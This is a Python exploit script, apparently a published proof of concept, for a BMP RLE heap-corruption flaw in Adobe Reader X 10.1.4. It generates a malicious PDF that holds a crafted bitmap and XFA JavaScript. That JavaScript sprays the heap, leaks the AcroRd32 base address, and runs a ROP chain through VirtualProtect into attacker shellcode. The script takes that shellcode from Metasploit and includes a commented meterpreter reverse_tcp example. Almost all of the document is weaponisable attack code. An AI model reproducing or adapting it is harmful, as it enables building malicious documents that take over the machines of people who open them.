'''
Title: Adobe Reader X BMP/RLE heap corruption
Product: Adobe Reader X
Version: 10.x
Product Homepage: adobe.com
Binary affected: AcroForm.api
Binary Version: 10.1.4.38
Binary MD5: 8e0fc0c6f206b84e265cc3076c4b9841
Configuration Requirements
-----------------------------------------
Default configuration.

Vulnerability Requirements
-----------------------------------------
None.

Vulnerability Description
-----------------------------------------
Adobe Reader X fails to validate the input when parsing an embedded BMP RLE encoded image. Arbitrary code execution in the context of the sandboxed process is proved possible after a malicious embeded bmp image triggers a heap overflow.


Vulnerability WorkAround (if possible)
-----------------------------------------
Delete AcroForm.api
'''
from hashlib import md5
import sys, struct
######### Begin of the miniPDF
import zlib

#For constructing a minimal pdf file
## PDF REference 3rd edition:: 3.2 Objects
class PDFObject:
    def __init__(self):
        self.n=None
        self.v=None
    def __str__(self):
        raise Exception("Fail")

## PDF REference 3rd edition:: 3.2.1 Booleans Objects
class PDFBool(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        if self.s:
            return "true"
        return "false"

## PDF REference 3rd edition:: 3.2.2 Numeric Objects
class PDFNum(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "%s"%self.s

## PDF REference 3rd edition:: 3.2.3 String Objects
class PDFString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "(%s)"%self.s

## PDF REference 3rd edition:: 3.2.3 String Objects / Hexadecimal Strings
class PDFHexString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "<" + "".join(["%02x"%ord(c) for c in self.s]) + ">"

## A convenient type of literal Strings
class PDFOctalString(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s="".join(["\\%03o"%ord(c) for c in s])
    def __str__(self):
        return "(%s)"%self.s

## PDF REference 3rd edition:: 3.2.4 Name Objects
class PDFName(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        self.s=s
    def __str__(self):
        return "/%s"%self.s

## PDF REference 3rd edition:: 3.2.5 Array Objects
class PDFArray(PDFObject):
    def __init__(self,s):
        PDFObject.__init__(self)
        assert type(s) == type([])
        self.s=s
    def append(self,o):
        self.s.append(o)
        return self
    def __str__(self):
        return "[%s]"%(" ".join([ o.__str__() for o in self.s]))

## PDF REference 3rd edition:: 3.2.6 Dictionary Objects
class PDFDict(PDFObject):
    def __init__(self, d={}):
        PDFObject.__init__(self)
        self.dict = {}
        for k in d:
            self.dict[k]=d[k]

    def __iter__(self):
        for k in self.dict.keys():
            yield k

    def __iterkeys__(self):
        for k in self.dict.keys():
            yield k

    def __getitem__(self, key):
        return self.dict[key]
        
    def add(self,name,obj):
        self.dict[name] = obj

    def get(self,name):
        if name in self.dict.keys():
            return self.dict[name]
        else:
            return None

    def __str__(self):
        s="<<"
        for name in self.dict:
            s+="%s %s "%(PDFName(name),self.dict[name])
        s+=">>"
        return s

## PDF REference 3rd edition:: 3.2.7 Stream Objects
class PDFStream(PDFDict):
    def __init__(self,d={},stream=""):
        PDFDict.__init__(self,d)
        self.stream=stream
        self.filtered=self.stream
        self.add('Length', len(stream))
        self.filters = []

    def appendFilter(self, filter):
        self.filters.append(filter)
        self._applyFilters() #yeah every time .. so what!

    def _applyFilters(self):
        self.filtered = self.stream
        for f in self.filters:
                self.filtered = f.encode(self.filtered)
        if len(self.filters)>0:
            self.add('Length', len(self.filtered))
            self.add('Filter', PDFArray([f.name for f in self.filters]))
        #Add Filter parameters ?
    def __str__(self):
        self._applyFilters() #yeah every time .. so what!
        s=""
        s+=PDFDict.__str__(self)
        s+="\nstream\n"
        s+=self.filtered
        s+="\nendstream"
        return s

## PDF REference 3rd edition:: 3.2.8 Null Object
class PDFNull(PDFObject):
    def __init__(self):
        PDFObject.__init__(self)

    def __str__(self):
        return "null"


## PDF REference 3rd edition:: 3.2.9 Indirect Objects
class UnResolved(PDFObject):
    def __init__(self,n,v):
        PDFObject.__init__(self)
        self.n=n
        self.v=v
    def __str__(self):
        return "UNRESOLVED(%d %d)"%(self.n,self.v)
class PDFRef(PDFObject):
    def __init__(self,obj):
        PDFObject.__init__(self)
        self.obj=[obj]
    def __str__(self):
        if len(self.obj)==0:
            return "null"
        return "%d %d R"%(self.obj[0].n,self.obj[0].v)

## PDF REference 3rd edition:: 3.3 Filters
## Example Filter...
class FlateDecode:
    name = PDFName('FlateDecode')
    def __init__(self):
        pass
    def encode(self,stream):
        return zlib.compress(stream)
    def decode(self,stream):
        return zlib.decompress(stream)

## PDF REference 3rd edition:: 3.4 File Structure
## Simplest file structure...
class PDFDoc():
    def __init__(self,obfuscate=0):
        self.objs=[]
        self.info=None
        self.root=None
    def setRoot(self,root):
        self.root=root
    def setInfo(self,info):
        self.info=info
    def _add(self,obj):
        if obj.v!=None or obj.n!=None:
            raise Exception("Already added!!!")
        obj.v=0
        obj.n=1+len(self.objs)
        self.objs.append(obj)
    def add(self,obj):
        if type(obj) != type([]):
            self._add(obj);
        else:
            for o in obj:
                self._add(o)
    def _header(self):
        return "%PDF-1.5\n%\xE7\xF3\xCF\xD3\n"
    def __str__(self):
        doc1 = self._header()
        xref = {}
        for obj in self.objs:
            xref[obj.n] = len(doc1)
            doc1+="%d %d obj\n"%(obj.n,obj.v)
            doc1+=obj.__str__()
            doc1+="\nendobj\n"
        posxref=len(doc1)
        doc1+="xref\n"
        doc1+="0 %d\n"%(len(self.objs)+1)
        doc1+="0000000000 65535 f \n"
        for xr in xref.keys():
            doc1+= "%010d %05d n \n"%(xref[xr],0)
        doc1+="trailer\n"
        trailer = PDFDict()
        trailer.add("Size",len(self.objs)+1)
        if self.root == None:
            raise Exception("Root not set!")
        trailer.add("Root",PDFRef(self.root))
        if self.info:
            trailer.add("Info",PDFRef(self.info))
        doc1+=trailer.__str__()
        doc1+="\nstartxref\n%d\n"%posxref
        doc1+="%%EOF"
        return doc1
######### End of miniPDF

SLIDESIZE=0x12C

def mkBMP(payload, exception=True):
    bmp = ''
    #getInfoHeader
    bfType = 0x4d42
    assert bfType in [0x4d42,0x4349,0x5043,0x4943,0x5043] #0x4142: not supp
    bmp += struct.pack('<H', bfType)

    bfSize = 0
    bfOffBits = 0
    bmp += struct.pack('<L', bfSize)
    bmp += struct.pack('<H', 0) #Reserved1
    bmp += struct.pack('<H', 0) #Reserved2
    bmp += struct.pack('<L', bfOffBits)


    biSize = 0x40
    assert not biSize in [0x12]
    bmp += struct.pack('<L', biSize)


    biHeight = 1
    biWidth = SLIDESIZE #size of texture structure LFH enabled
    biPlanes = 1
    biBitCount = 8
    biCompression = 1
    biSizeImage = 0
    biXPelsPerMeter = 0
    biYPelsPerMeter = 0
    biClrUsed = 2
    if biClrUsed >0xff:
        raise "BUG!!!!"

    biClrImportant = 0
    bmp += struct.pack('<L', biWidth)
    bmp += struct.pack('<L', biHeight)
    bmp += struct.pack('<H', biPlanes)
    bmp += struct.pack('<H', biBitCount)
    bmp += struct.pack('<L', biCompression)
    bmp += struct.pack('<L', biSizeImage)
    bmp += struct.pack('<L', biXPelsPerMeter)
    bmp += struct.pack('<L', biYPelsPerMeter)
    bmp += struct.pack('<L', biClrUsed)
    bmp += struct.pack('<L', biClrImportant)
    bmp += 'A'*(biSize-0x40) #pad

    numColors=biClrUsed
    if biClrUsed == 0 or biBitCount < 8:
        numColors = 1<<biBitCount;

    bmp += 'RGBA'*(numColors) #pallete

    bmp += '\x00\x02\xff\x00' * ((0xffffffff-0xff) / 0xff)

    #while (len(bmp)+10)%0x400 != 0:
    # bmp += '\x00\x02\x00\x00'

    assert len(payload) < 0x100 and len(payload) >= 3


    bmp += '\x00\x02'+chr(0x100-len(payload))+'\x00'
    bmp += '\x00'+chr(len(payload))+payload

    if len(payload)&1 :
        bmp += 'P'

    if exception:
        bmp += '\x00\x02\x00\xff'*10 #getting the pointer outside the texture so it triggers an exception
        bmp += '\x00'+chr(10)+'X'*10
    else:
        bmp += '\x00\x01'
        #'\x04X'*(biWidth+2000)+"\x00\x02"
    return bmp

def UEncode(s):
    r = ''
    s += '\x00'*(len(s)%2)
    for i in range(0,len(s),2):
        r+= '\\u%04x'%(struct.unpack('<H', (s[i:i+2]))[0])
    return r
    r = ''
    for c in s:
        r+= '%%%02x'%ord(c)
    return r


def mkXFAPDF(shellcode = '\x90'*0x400+'\xcc'):
    xdp = '''
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/" timeStamp="2012-11-23T13:41:54Z" uuid="0aa46f9b-2c50-42d4-ab0b-1a1015321da7">
<template xmlns:xfa="http://www.xfa.org/schema/xfa-template/3.1/" xmlns="http://www.xfa.org/schema/xfa-template/3.0/">
<?formServer defaultPDFRenderFormat acrobat9.1static?>
<?formServer allowRenderCaching 0?>
<?formServer formModel both?>
<subform name="form1" layout="tb" locale="en_US" restoreState="auto">
<pageSet>
<pageArea name="Page1" id="Page1">
<contentArea x="0.25in" y="0.25in" w="576pt" h="756pt"/>
<medium stock="default" short="612pt" long="792pt"/>
<?templateDesigner expand 1?>
</pageArea>
<?templateDesigner expand 1?>
</pageSet>
<variables>
<script name="util" contentType="application/x-javascript">
// Convenience functions to pack and unpack litle endian an utf-16 strings
function pack(i){
var low = (i &amp; 0xffff);
var high = ((i&gt;&gt;16) &amp; 0xffff);
return String.fromCharCode(low)+String.fromCharCode(high);
}
function unpackAt(s, pos){
return s.charCodeAt(pos) + (s.charCodeAt(pos+1)&lt;&lt;16);
}
function packs(s){
result = "";
for (i=0;i&lt;s.length;i+=2)
result += String.fromCharCode(s.charCodeAt(i) + (s.charCodeAt(i+1)&lt;&lt;8));
return result;
}
function packh(s){
return String.fromCharCode(parseInt(s.slice(2,4)+s.slice(0,2),16));
}
function packhs(s){
result = "";
for (i=0;i&lt;s.length;i+=4)
result += packh(s.slice(i,i+4));
return result;
}
var verbose = 1;
function message(x){
if (util.verbose == 1 )
xfa.host.messageBox(x);
}

//ROP0
//7201E63D XCHG EAX,ESP
//7201E63E RETN
//ROP1
//7200100A JMP DWORD PTR DS:[KERNEL32.GetModuleHandle]
//ROP2
//7238EF5C PUSH EAX
//7238EF5D CALL DWORD PTR DS:[KERNEL32.GetProcAddress]
//7238EF63 TEST EAX,EAX
//7238EF65 JNE SHORT 7238EF84
//7238EF84 POP EBP
//7238EF85 RETN 4
//ROP3
//72001186 JMP EAX ; kernel32.VirtualProtect
//ROP4
//72242491 ADD ESP,70
//72242494 RETN


var _offsets = {'Reader": { "10.104": {
"acrord32": 0xA4,
"rop0": 0x1E63D,
"rop1": 0x100A,
"rop2": 0x38EF5C,
"rop3": 0x1186,
"rop4": 0x242491,
},
"10.105": { // Added by Eddie Mitchell
"acrord32": 0xA5,
"rop0": 0x1E52D,
"rop1": 0x100A,
"rop2": 0x393526,
"rop3": 0x1186,
"rop4": 0x245E71,
},
"10.106": { // Added by Eddie Mitchell
"acrord32": 0xA5,
"rop0": 0x1E52D,
"rop1": 0x100A,
"rop2": 0x393526,
"rop3": 0x1186,
"rop4": 0x245E71,
},
},
"Exchange-Pro": {
"10.105": { // Added by Eddie Mitchell
"acrobat": 0xCD,
"rop0": 0x3720D,
"rop1": 0x100A,
"rop2": 0x3DCC91,
"rop3": 0x180F,
"rop4": 0x25F2A1,
},
},
};

function offset(x){
//app.viewerType will be "Reader" for Reader,
//"Exchange" for Acrobat Standard or "Exchange-Pro" for Acrobat Pro
try {
return _offsets[app.viewerType][app.viewerVersion][x];
}
catch (e) {
xfa.host.messageBox("Type:" +app.viewerType+ " Version: "+app.viewerVersion+" NOT SUPPORTED!");
}
return 0x41414141;
}

</script>
<script name="spray" contentType="application/x-javascript">
// Global variable for spraying
var slide_size=%%SLIDESIZE%%;
var size = 200;
var chunkx = "%%MINICHUNKX%%";
var x = new Array(size);
var y = new Array(size);
var z = new Array(size);
var pointers = new Array(100);
var done = 0;
</script>
<?templateDesigner expand 1?>
</variables>
<subform w="576pt" h="756pt">
<!-- This image fiel hold the cashing image -->
<field name="ImageCrash">
<ui> <imageEdit/> </ui>
<value>
<image aspect="actual" contentType="image/jpeg">%%BMPFREELFH%%</image>
</value>
</field>
</subform>
<event activity="initialize" name="event__initialize">
<script contentType="application/x-javascript">
// This script runs at the very beginning and
// is used to prepare the memory layout
util.message("Initialize");
var i; var j;
if (spray.done == 0){
//Trigger LFH use
var TOKEN = "\u5858\u5858\u5678\u1234";
var chunk_len = spray.slide_size/2-1-(TOKEN.length+2+2);

for (i=0; i &lt; spray.size; i+=1)
spray.x[i] = TOKEN + util.pack(i) +
spray.chunkx.substring(0, chunk_len) +
util.pack(i) + "";

util.message("Initial spray done!");
for (j=0; j &lt; size; j++)
for (i=spray.size-1; i &gt; spray.size/4; i-=10)
spray.x[i]=null;

spray.done = 1;
util.message("Generating holes done!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
}
// After this the form layout is rendered and the bug triggered
</script>
</event>
<event activity="docReady" ref="$host" name="event__docReady">
<script contentType="application/x-javascript">
// This script runs once the page is ready
util.message("DocReady");
var i; var j;
var found = -1; // Index of the overlapped string
var acro = 0; // Base of the AcroRd32_dll

// Search over all strings for the first one with the broken TOKEN
for (i=0; i &lt; spray.size; i+=1)
if ((spray.x[i]!=null) &amp;&amp; (spray.x[i][0] != "\u5858")){
found = i;
acro = (( util.unpackAt(spray.x[i], 14) &gt;&gt; 16) - util.offset("acrord32")) &lt;&lt; 16;
util.message("Found! String number "+ found + " has been corrupted acrord32.dll:" + acro.toString(16) );
break;
}
// Behaviour is mostly undefined if not found
if (found == -1){
util.message("Corrupted String NOT Found!");
event.target.closeDoc(true);
}

// Corrupted string was found let's generates the new
// string for overlapping the struct before freeing it
var chunky = "";
for (i=0; i &lt; 7; i+=1)
chunky += util.pack(0x41414141);
chunky += util.pack(0x10101000);
while (chunky.length &lt; spray.slide_size/2)
chunky += util.pack(0x58585858);

// Free the overlapping string
util.message("Feeing corrupted string! Previous string will we used-free ("+(found)+")");
for (j=0; j &lt; 100000; j++)
spray.x[found-1]=spray.x[found]=null;

// Trigger several allocs that will fall over the structure
for (i=0; i &lt; 200; i+=1){
ID = "" + i;
spray.y[i] = chunky.substring(0,spray.slide_size/2-ID.length) + ID+ "";
}
util.message("Allocated 20 chunks-y\\n");

// Heap spraying make's baby jesus cry!
// Construct the 0x1000 small chunk for spraying
var obj = 0x10101000;
var pointer_slide = "";
pointer_slide += util.pack(acro+util.offset("rop4")); //add esp,70;ret
for (i=0; i &lt; 27; i+=1)
pointer_slide += util.pack(0x41414141);
obj += pointer_slide.length*2;
// ROP
pointer_slide += util.pack(acro+util.offset("rop0")); //XCHG EAX,ESP;ret
pointer_slide += util.pack(acro+util.offset("rop1")); //0x100A jmp getmodule
pointer_slide += util.pack(acro+util.offset("rop2")); //@0x04 - getProcAddress
pointer_slide += util.pack(obj+0xDC); //@0x08 point to KERNEL32
//@0x10
pointer_slide += util.pack(obj+0xCC);
pointer_slide += util.pack(0x43434343); // POPPED TO EBP
pointer_slide += util.pack(acro+util.offset("rop3")); // JMP EAX
pointer_slide += util.pack(obj); //Points to offset 0 of this
//@0x20
pointer_slide += util.pack(obj+0x38);
pointer_slide += util.pack(obj+0x38);
pointer_slide += util.pack(0x1000); //SIZE_T dwSize,
pointer_slide += util.pack(0x40); // DWORD flNewProtect,
//0x30
pointer_slide += util.pack(obj+0x34); //PDWORD lpflOldProtect
pointer_slide += util.pack(0x00000000); //DWORD OldProtect
pointer_slide += util.packhs("E9B1000000909090");
//0x40
pointer_slide += util.pack(acro); //Used by next stage
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
//0x50
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
//0x60
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.pack(0xCCCCCCCC);
//0x70
pointer_slide += util.pack(acro);
pointer_slide += util.pack(0x48484848);
pointer_slide += util.pack(0x49494949);
pointer_slide += util.pack(0x49494949);

//0x80
pointer_slide += util.pack(0x49494949);
pointer_slide += util.pack(0x50505050);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
//0x90
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
//0xa0
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
//0xb0
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
//0xc0
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0x46464646);
pointer_slide += util.pack(0xCCCCCCCC);
pointer_slide += util.packs("VirtualProtect"); //@0xCC
pointer_slide += "\u0000";
pointer_slide += "KERNEL32";
pointer_slide += "\u0000";
pointer_slide += "%%SHELLCODE%%";
while (pointer_slide.length &lt; 0x1000/2)
pointer_slide += util.pack(0x41414141);
pointer_slide = pointer_slide.substring(0,0x1000/2);
util.message("Pointer slide size: " + pointer_slide.length);

// And now ensure it gets bigger than 0x100000 bytes
while (pointer_slide.length &lt; 0x100000/2)
pointer_slide += pointer_slide;
// And the actual spray
for (i=0; i &lt; 100; i+=1)
spray.pointers[i] = pointer_slide.substring(16, 0x100000/2-16-2)+ util.pack(i) + "";

// Everything done here close the doc and
// trigger the use of the vtable
util.message("Now what?");
var pdfDoc = event.target;
pdfDoc.closeDoc(true);

</script>
</event>
</subform>
<?originalXFAVersion http://www.xfa.org/schema/xfa-template/2.5/?>
<?templateDesigner DefaultLanguage JavaScript?>
<?templateDesigner DefaultRunAt client?>
<?acrobat JavaScript strictScoping?>
<?PDFPrintOptions embedViewerPrefs 0?>
<?PDFPrintOptions embedPrintOnFormOpen 0?>
<?PDFPrintOptions scalingPrefs 0?>
<?PDFPrintOptions enforceScalingPrefs 0?>
<?PDFPrintOptions paperSource 0?>
<?PDFPrintOptions duplexMode 0?>
<?templateDesigner DefaultPreviewType interactive?>
<?templateDesigner DefaultPreviewPagination simplex?>
<?templateDesigner XDPPreviewFormat 19?>
<?templateDesigner DefaultCaptionFontSettings face:Myriad Pro;size:10;weight:normal;style:normal?>
<?templateDesigner DefaultValueFontSettings face:Myriad Pro;size:10;weight:normal;style:normal?>
<?templateDesigner Zoom 119?>
<?templateDesigner FormTargetVersion 30?>
<?templateDesigner SaveTaggedPDF 1?>
<?templateDesigner SavePDFWithEmbeddedFonts 1?>
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?></template>
<config xmlns="http://www.xfa.org/schema/xci/3.0/">
<agent name="designer">
<!-- [0..n] -->
<destination>pdf</destination>
<pdf>
<!-- [0..n] -->
<fontInfo/>
</pdf>
</agent>
<present>
<!-- [0..n] -->
<pdf>
<!-- [0..n] -->
<version>1.7</version>
<adobeExtensionLevel>5</adobeExtensionLevel>
</pdf>
<common/>
<xdp>
<packets>*</packets>
</xdp>
</present>
</config>
<localeSet xmlns="http://www.xfa.org/schema/xfa-locale-set/2.7/">
<locale name="en_US" desc="English (United States)">
<calendarSymbols name="gregorian">
<monthNames>
<month>January</month>
<month>February</month>
<month>March</month>
<month>April</month>
<month>May</month>
<month>June</month>
<month>July</month>
<month>August</month>
<month>September</month>
<month>October</month>
<month>November</month>
<month>December</month>
</monthNames>
<monthNames abbr="1">
<month>Jan</month>
<month>Feb</month>
<month>Mar</month>
<month>Apr</month>
<month>May</month>
<month>Jun</month>
<month>Jul</month>
<month>Aug</month>
<month>Sep</month>
<month>Oct</month>
<month>Nov</month>
<month>Dec</month>
</monthNames>
<dayNames>
<day>Sunday</day>
<day>Monday</day>
<day>Tuesday</day>
<day>Wednesday</day>
<day>Thursday</day>
<day>Friday</day>
<day>Saturday</day>
</dayNames>
<dayNames abbr="1">
<day>Sun</day>
<day>Mon</day>
<day>Tue</day>
<day>Wed</day>
<day>Thu</day>
<day>Fri</day>
<day>Sat</day>
</dayNames>
<meridiemNames>
<meridiem>AM</meridiem>
<meridiem>PM</meridiem>
</meridiemNames>
<eraNames>
<era>BC</era>
<era>AD</era>
</eraNames>
</calendarSymbols>
<datePatterns>
<datePattern name="full">EEEE, MMMM D, YYYY</datePattern>
<datePattern name="long">MMMM D, YYYY</datePattern>
<datePattern name="med">MMM D, YYYY</datePattern>
<datePattern name="short">M/D/YY</datePattern>
</datePatterns>
<timePatterns>
<timePattern name="full">h:MM:SS A Z</timePattern>
<timePattern name="long">h:MM:SS A Z</timePattern>
<timePattern name="med">h:MM:SS A</timePattern>
<timePattern name="short">h:MM A</timePattern>
</timePatterns>
<dateTimeSymbols>GyMdkHmsSEDFwWahKzZ</dateTimeSymbols>
<numberPatterns>
<numberPattern name="numeric">z,zz9.zzz</numberPattern>
<numberPattern name="currency">$z,zz9.99|($z,zz9.99)</numberPattern>
<numberPattern name="percent">z,zz9%</numberPattern>
</numberPatterns>
<numberSymbols>
<numberSymbol name="decimal">.</numberSymbol>
<numberSymbol name="grouping">,</numberSymbol>
<numberSymbol name="percent">%</numberSymbol>
<numberSymbol name="minus">-</numberSymbol>
<numberSymbol name="zero">0</numberSymbol>
</numberSymbols>
<currencySymbols>
<currencySymbol name="symbol">$</currencySymbol>
<currencySymbol name="isoname">USD</currencySymbol>
<currencySymbol name="decimal">.</currencySymbol>
</currencySymbols>
<typefaces>
<typeface name="Myriad Pro"/>
<typeface name="Minion Pro"/>
<typeface name="Courier Std"/>
<typeface name="Adobe Pi Std"/>
<typeface name="Adobe Hebrew"/>
<typeface name="Adobe Arabic"/>
<typeface name="Adobe Thai"/>
<typeface name="Kozuka Gothic Pro-VI M"/>
<typeface name="Kozuka Mincho Pro-VI R"/>
<typeface name="Adobe Ming Std L"/>
<typeface name="Adobe Song Std L"/>
<typeface name="Adobe Myungjo Std M"/>
</typefaces>
</locale>
<?originalXFAVersion http://www.xfa.org/schema/xfa-locale-set/2.1/?></localeSet>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data xfa:dataNode="dataGroup"/>
</xfa:datasets>
<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.2-c001 63.139439, 2011/06/07-10:39:26 ">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/" rdf:about="">
<xmp:MetadataDate>2012-11-23T13:41:54Z</xmp:MetadataDate>
<xmp:CreatorTool>Adobe LiveCycle Designer ES 10.0</xmp:CreatorTool>
<xmp:ModifyDate>2012-11-23T05:26:02-08:00</xmp:ModifyDate>
<xmp:CreateDate>2012-11-23T05:15:47-08:00</xmp:CreateDate>
</rdf:Description>
<rdf:Description xmlns:pdf="http://ns.adobe.com/pdf/1.3/" rdf:about="">
<pdf:Producer>Adobe LiveCycle Designer ES 10.0</pdf:Producer>
</rdf:Description>
<rdf:Description xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/" rdf:about="">
<xmpMM:DocumentID>uuid:0aa46f9b-2c50-42d4-ab0b-1a1015321da7</xmpMM:DocumentID>
<xmpMM:InstanceID>uuid:86c66599-7238-4e9f-8fad-fe2cd922afb2</xmpMM:InstanceID>
</rdf:Description>
<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/" rdf:about="">
<dc:format>application/pdf</dc:format>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>
<xfdf xmlns="http://ns.adobe.com/xfdf/" xml:space="preserve">
<annots/>
</xfdf></xdp:xdp>
'''
    assert len(shellcode) <= 0xF00, "You need a smaller shellcode, sorry"

    #shellcode
    xdp = xdp.replace("%%SHELLCODE%%",UEncode(shellcode))
    xdp = xdp.replace("%%SLIDESIZE%%", "0x%x"%SLIDESIZE);
    xdp = xdp.replace("%%MINICHUNKX%%",UEncode('O'*SLIDESIZE))
    xdp = xdp.replace("%%BMPFREELFH%%",mkBMP('\x01\x00\x00\x00\x00\x00'+ chr(0x27)+'\x05',True).encode('base64'))
    #xdp = xdp.replace("%%BMPFREELFH%%",file("/usr/share/pixmaps/gnome-news.png","rb").read().encode('base64'))

    file("%s.log"%sys.argv[0].split('.')[0],'wb').write(xdp)
    #The document
    doc = PDFDoc()
    
    #font
    font = PDFDict()
    font.add("Name", PDFName("F1"))
    font.add("Subtype", PDFName("Type1"))
    font.add("BaseFont", PDFName("Helvetica"))

    #name:font map
    fontname = PDFDict()
    fontname.add("F1",font)

    #resources
    resources = PDFDict()
    resources.add("Font",fontname)
    
    #contents
    contentsDict = PDFDict()
    contents= PDFStream(contentsDict, '''BT
/F1 24 Tf
100 100 Td
(Pedefe Pedefeito Pedefeon!) Tj
ET''')
    
    #page
    page = PDFDict()
    page.add("Type",PDFName("Page"))
    page.add("Resources",resources)
    page.add("Contents", PDFRef(contents))

    #pages
    pages = PDFDict()
    pages.add("Type", PDFName("Pages"))
    pages.add("Kids", PDFArray([PDFRef(page)]))
    pages.add("Count", PDFNum(1))

    #add parent reference in page
    page.add("Parent",PDFRef(pages))

    xfa = PDFStream(PDFDict(), xdp)
    xfa.appendFilter(FlateDecode())
    doc.add(xfa)

    #form
    form = PDFDict()
    form.add("XFA", PDFRef(xfa))
    doc.add(form)

    #shellcode2
    shellcode2 = PDFStream(PDFDict(), struct.pack("<L",0xcac0face)+"\xcc"*10)
    doc.add(shellcode2)

    #catalog
    catalog = PDFDict()
    catalog.add("Type", PDFName("Catalog"))
    catalog.add("Pages", PDFRef(pages))
    catalog.add("NeedsRendering", "true")
    catalog.add("AcroForm", PDFRef(form))


    adbe = PDFDict()
    adbe.add("BaseVersion","/1.7")
    adbe.add("ExtensionLevel",PDFNum(3))

    extensions = PDFDict()
    extensions.add("ADBE", adbe)

    catalog.add("Extensions",extensions)
    doc.add([catalog,pages,page,contents])
    doc.setRoot(catalog)


    #render it
    return doc.__str__()


if __name__ == '__main__':
    import optparse,os
    from subprocess import Popen, PIPE
    parser = optparse.OptionParser(description='Adobe Reader X 10.1.4 XFA BMP RLE Exploit')
    parser.add_option('--debug', action='store_true', default=False, help='For debugging')
    parser.add_option('--msfpayload', metavar='MSFPAYLOAD', default="windows/messagebox ", help="Metasploit payload. Ex. 'win32_exec CMD=calc'")
    parser.add_option('--payload', metavar='PAYLOAD', default=None)
    parser.add_option('--doc', action='store_true', default=False, help='Print detailed documentation')
    (options, args) = parser.parse_args()
 
    if options.doc:
        print __doc__
        os.exit(-1)

    if options.debug:
        print mkXFAPDF(),
        os.exit(-1)
    if options.payload == None:
        #"windows/meterpreter/reverse_tcp LHOST=192.168.56.1 EXITFUNC=process R"
        msfpayload = Popen("msfpayload4.4 %s R"%options.msfpayload, shell=True, stdout=PIPE)
        shellcode = msfpayload.communicate()[0]
    else:
        shellcode = file(options.payload, "rb").read() #options.hexpayload.decode('hex')
    print mkXFAPDF(shellcode),

